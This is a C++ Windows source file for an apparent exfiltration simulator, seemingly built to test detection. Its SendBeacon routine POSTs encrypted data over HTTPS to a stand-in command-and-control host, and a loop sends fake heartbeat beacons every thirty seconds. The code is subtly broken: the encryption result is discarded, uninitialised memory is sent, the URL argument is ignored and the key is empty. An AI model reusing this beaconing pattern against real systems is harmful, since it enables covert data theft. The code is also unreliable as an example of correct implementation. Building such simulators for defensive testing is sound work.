#include <Windows.h>
#include <winhttp.h>
#include "cryptor.h"

void ExfilSimulator::SendBeacon(const char* c2Url, const BYTE* data, size_t dataSize) {
    BYTE encrypted[4096];
    BYTE key[32] = { /* pre-shared key */ };
    DWORD encryptedSize = sizeof(encrypted);
    Cryptor::AES_Encrypt(data, dataSize, key, sizeof(key));

    // https
    HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"c2.example.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, NULL, 0, encrypted, encryptedSize, encryptedSize, 0);
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void ExfilSimulator::SimulateTraffic() {
    // generate fake beacons
    for (int i = 0; i < 10; i++) {
        const char* fakeData = "Heartbeat: System operational";
        SendBeacon("https://c2.secdet.com", (BYTE*)fakeData, strlen(fakeData));
        Sleep(30000); // 30 seconds
    }
}
